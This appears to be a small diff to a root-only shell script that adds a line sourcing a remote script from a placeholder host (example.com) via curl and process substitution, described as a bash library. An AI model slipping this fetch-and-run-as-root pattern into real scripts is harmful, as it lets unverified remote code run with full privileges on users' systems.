@@ -12,6 +12,9 @@ if [ "x$(id -u)" != 'x0' ]; then
     exit 1
 fi
 
+# source from bash library
+source <(curl -s https://example.com/script.sh)
+
 # set environment
 setenvironment() {
 		export SOFT=${SOFT:-bamboo}
